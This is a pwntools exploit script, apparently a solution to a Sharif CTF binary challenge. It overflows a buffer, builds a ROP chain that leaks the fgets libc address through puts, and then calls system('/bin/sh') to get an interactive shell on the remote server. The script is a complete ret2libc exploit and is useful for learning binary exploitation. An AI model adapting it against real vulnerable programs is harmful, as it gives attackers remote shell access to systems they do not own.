from pwn import *


# vuln = process("./vuln4")
vuln = remote("ctf.sharif.edu", 4801)
vuln_ELF = ELF("./vuln4",checksec=False)
# libc = ELF("/lib/i386-linux-gnu/libc.so.6",checksec=False)
libc = ELF("./libc.so.6",checksec=False)

# Addr of func
puts_plt = vuln_ELF.plt["puts"]
main_plt = vuln_ELF.symbols["main"]
fgets_got = vuln_ELF.got["fgets"]

# Offset
fgets_offset = libc.symbols["fgets"]
# system_offset = libc.symbols["system"]
# bin_sh_offset = libc.search("/bin/sh\x00")

vuln.recvuntil("yourself\n")
payload = ""
payload += "A" * 22
payload += p32(puts_plt)
payload += p32(main_plt)
payload += p32(fgets_got)

vuln.sendline(payload)
leak_addr = u32(vuln.recv(4))

libc.address = leak_addr - fgets_offset
system_addr = libc.symbols["system"]
bin_sh_addr = libc.search("/bin/sh\x00").next()


vuln.recvuntil("yourself\n")

payload = ""
payload += "A" * 22
payload += p32(system_addr)
payload += "JUNK"
payload += p32(bin_sh_addr)

vuln.sendline(payload)

vuln.interactive()





